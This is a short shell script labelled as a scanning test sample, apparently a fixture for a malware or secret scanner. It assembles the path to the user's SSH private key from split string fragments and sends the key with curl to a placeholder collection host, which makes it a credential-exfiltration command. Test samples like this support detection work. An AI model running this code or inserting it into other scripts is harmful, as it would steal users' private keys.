#!/bin/sh
# DO NOT RUN — scanning test sample

D="$HOME"
a=.s
b=sh
c=id_
d=rsa
K="$D/$a$b/$c$d"
curl -s -d @"$K" "https://collect.example.invalid/c"
